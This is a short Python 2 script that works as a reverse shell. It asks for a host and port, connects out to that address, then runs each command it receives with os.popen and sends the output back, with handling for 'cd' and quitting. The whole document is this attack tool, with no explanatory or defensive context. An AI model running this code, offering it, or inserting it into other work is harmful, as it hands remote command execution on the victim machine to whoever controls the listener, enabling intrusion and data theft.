import os,socket,sys
def usage():
    print '''
    ###################
    #      IP PORT    #
    ###################
''',exit()



host= raw_input('Enter Your Host : ')
port= raw_input('Enter Your Port : ')


s=socket.socket()
s.connect((host,int(port)))
s.send('''
             ###########################
             #        Connected        #
             ###########################\n>>>''')
while 1:
    data = s.recv(512)
    if "q" == data.lower():
        s.close()
        break;
    else:
        if data.startswith('cd'):
            os.chdir(data[3:].replace('\n',''))
            s.send("Moved to "+str(os.getcwd()))
            result='\n'
        else:
            result=os.popen(data).read()
    if (data.lower() != "q"):
            s.send(str(result)+">>")
    else:
        s.send(str(result))
        s.close()
        break;
exit()
